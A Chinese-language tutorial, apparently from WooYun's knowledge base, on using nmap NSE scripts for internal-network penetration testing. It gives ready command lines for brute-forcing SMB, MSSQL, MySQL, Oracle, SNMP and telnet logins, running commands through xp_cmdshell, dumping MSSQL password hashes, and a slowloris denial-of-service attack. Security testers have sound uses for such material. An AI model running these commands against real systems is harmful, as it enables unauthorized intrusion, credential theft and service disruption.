# nmap脚本使用总结

0x00 前言：
--------

* * *

nmap的基本介绍和基本使用方法，在乌云知识库中已经有人提交过，讲的比较详细，在此文中就不再讲述。 具体链接：[http://drops.wooyun.org/tips/2002](http://drops.wooyun.org/tips/2002)

本文主要讲解nmap的众多脚本的使用，在内网渗透的时候尤其好用。

0x01 nmap按脚本分类扫描
----------------

* * *

nmap脚本主要分为以下几类，在扫描时可根据需要设置--script=类别这种方式进行比较笼统的扫描：

* * *

```
auth: 负责处理鉴权证书（绕开鉴权）的脚本  
broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  
brute: 提供暴力破解方式，针对常见的应用如http/snmp等  
default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  
discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  
dos: 用于进行拒绝服务攻击  
exploit: 利用已知的漏洞入侵系统  
external: 利用第三方的数据库或资源，例如进行whois解析  
fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  
malware: 探测目标机是否感染了病毒、开启了后门等信息  
safe: 此类与intrusive相反，属于安全性脚本  
version: 负责增强服务与版本扫描（Version Detection）功能的脚本  
vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067

```

部分使用截图：

（1）`nmap --script=auth 192.168.137.*`

负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令

![2014060615534754396.jpg](http://drops.javaweb.org/uploads/images/a00b1e40c6e0cf088bcea2daa64ee17d3023199b.jpg)

![2014060615542724331.jpg](http://drops.javaweb.org/uploads/images/fdc62335814345c755f4d22cb20e9971aee0c4d0.jpg)

（2）`nmap --script=brute 192.168.137.*`

提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解

![2014060615563891852.jpg](http://drops.javaweb.org/uploads/images/eb260429adf15f0ce876d1b9531cb6d1e3e0c84b.jpg)

（3）`nmap --script=default 192.168.137.*`或者`nmap -sC 192.168.137.*`

默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击

![2014060615573246791.jpg](http://drops.javaweb.org/uploads/images/d11fb959013aa3cc29109845bb0992fdf95393ef.jpg)

![2014060615575272523.jpg](http://drops.javaweb.org/uploads/images/f5b137d6dfd9dd7099f9aaee782543e77d7bb767.jpg)

（4）`nmap --script=vuln 192.168.137.*`   

检查是否存在常见漏洞

![enter image description here](http://drops.javaweb.org/uploads/images/a1ca32d742136ac3105fbe6b3e0ca5532d62298e.jpg)

![2014060615591092492.jpg](http://drops.javaweb.org/uploads/images/717acae30634b2d5910ffcc557d983606b0e1550.jpg)

![2014060615595719894.jpg](http://drops.javaweb.org/uploads/images/69d3ddf0517880a275d134524764f46826fbd590.jpg)

（5）`nmap -n -p445 --script=broadcast 192.168.137.4`

在局域网内探查更多服务开启状况

![enter image description here](http://drops.javaweb.org/uploads/images/8fa5dc69fb207d864ea56d335645ad84e3a08b50.jpg)

（6）`nmap --script external 202.103.243.110` 

利用第三方的数据库或资源，例如进行whois解析

![enter image description here](http://drops.javaweb.org/uploads/images/ff1c7f7e83dfc5719cb8280a7bb8e67bd6ded193.jpg)

0x02 nmap按应用服务扫描
----------------

* * *

（1）vnc扫描：

检查vnc bypass

```
nmap  --script=realvnc-auth-bypass 192.168.137.4  

```

![2014060616053748232.jpg](http://drops.javaweb.org/uploads/images/4e2676089a94a0411fc5df91aae21a36d55054ed.jpg)

![2014060616051988850.jpg](http://drops.javaweb.org/uploads/images/75d8c2ca256d691086e0aa73bf3c950a6b1904ea.jpg)

检查vnc认证方式

```
nmap  --script=vnc-auth  192.168.137.4  

```

获取vnc信息

```
nmap  --script=vnc-info  192.168.137.4  

```

（2）smb扫描：

smb破解

```
nmap  --script=smb-brute.nse 192.168.137.4  

```

smb字典破解

```
nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4  

```

![enter image description here](http://drops.javaweb.org/uploads/images/46c1616168d5b7e3535c7045df6f84106132f331.jpg)

smb已知几个严重漏

```
nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4    

```

![2014060616100977307.jpg](http://drops.javaweb.org/uploads/images/3fc8697141d2b76073d145b5f19cf3d065ed1baf.jpg)

查看共享目录  

```
nmap -p 445  --script smb-ls --script-args ‘share=e$,path=\,smbuser=test,smbpass=test’ 192.168.137.4    

```

查询主机一些敏感信息（注：需要下载nmap_service）

```
nmap -p 445 -n –script=smb-psexec --script-args= smbuser=test,smbpass=test 192.168.137.4   

```

![enter image description here](http://drops.javaweb.org/uploads/images/2bb9a0d5b0e26f33df8d276edfbfc1712ad099b4.jpg)

查看会话

```
nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=test,smbpass=test 192.168.137.4    

```

系统信息

```
nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=test,smbpass=test 192.168.137.4  

```

（3）Mssql扫描：

猜解mssql用户名和密码

```
nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4    

```

![2014060616135770347.jpg](http://drops.javaweb.org/uploads/images/18682644f7d791034b85e5e3ac7b1cbc8cda0425.jpg)

xp_cmdshell 执行命令 

```
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user" 192.168.137.4       

```

![2014060616145120758.jpg](http://drops.javaweb.org/uploads/images/d35564abffa339fa3323d11db4332a97d99a679a.jpg)

dumphash值

```
nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mssql.password=sa  192.168.137.4      

```

![enter image description here](http://drops.javaweb.org/uploads/images/a2576a69359686c215a306f203f7ae1344593538.jpg)

（4）Mysql扫描：

扫描root空口令

```
nmap -p3306 --script=mysql-empty-password.nse 192.168.137.4   

```

![enter image description here](http://drops.javaweb.org/uploads/images/a26fbfa08f8e697ed85ac322b4dd2ec2568e621c.jpg)

列出所有mysql用户

```
nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4   

```

支持同一应用的所有脚本扫描

```
nmap --script=mysql-* 192.168.137.4  

```

![enter image description here](http://drops.javaweb.org/uploads/images/4725f3ffdc4be304f6c74a057a7c99259d3c84f8.jpg)

（5）Oracle扫描：

oracle sid扫描

```
nmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5   

```

![enter image description here](http://drops.javaweb.org/uploads/images/f762fe3c45553e0bb21604fbe70aa726b58368f8.jpg)

oracle弱口令破解

```
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5      

```

![enter image description here](http://drops.javaweb.org/uploads/images/5f7e27d416f0d215f4706e30e001863fadbafdf3.jpg)

（6）其他一些比较好用的脚本

```
nmap --script=broadcast-netbios-master-browser 192.168.137.4   发现网关  
nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' 192.168.137.4  破解rsync  
nmap --script informix-brute -p 9088 192.168.137.4    informix数据库破解  
nmap -p 5432 --script pgsql-brute 192.168.137.4       pgsql破解  
nmap -sU --script snmp-brute 192.168.137.4            snmp破解  
nmap -sV --script=telnet-brute 192.168.137.4          telnet破解  
nmap --script=http-vuln-cve2010-0738 --script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}' <target>  jboss autopwn  
nmap --script=http-methods.nse 192.168.137.4 检查http方法  
nmap --script http-slowloris --max-parallelism 400 192.168.137.4  dos攻击，对于处理能力较小的站点还挺好用的 'half-HTTP' connections   
nmap --script=samba-vuln-cve-2012-1182  -p 139 192.168.137.4

```

（7）不靠谱的脚本：

vnc-brute    次数多了会禁止连接

pcanywhere-brute   同上

![2014060616350538005.jpg](http://drops.javaweb.org/uploads/images/c4c99c404caf3210347e299a067bcc945cc6e709.jpg)

0x03  学会脚本分析
------------

* * *

nmap中脚本并不难看懂，所以在使用时如果不知道原理可以直接看利用脚本即可，也可以修改其中的某些参数方便自己使用。

举例：

关于oracle的弱口令破解：

调用过程：oracle-brute.nse >> oracle-default-accounts.lst

首先是调用破解脚本：

![2014060616383416251.jpg](http://drops.javaweb.org/uploads/images/95f23c73bb12ecd24cc56076769f881ad8f46ab5.jpg)

根据脚本中字典的位置去查看默认字典，当然也可以将破解的字符自行添加其中，或者是修改脚本或参数改变破解字典：

![2014060616385857682.jpg](http://drops.javaweb.org/uploads/images/ad350a3b0b2dcb997f6dc9aaeff5a3aca4e27564.jpg)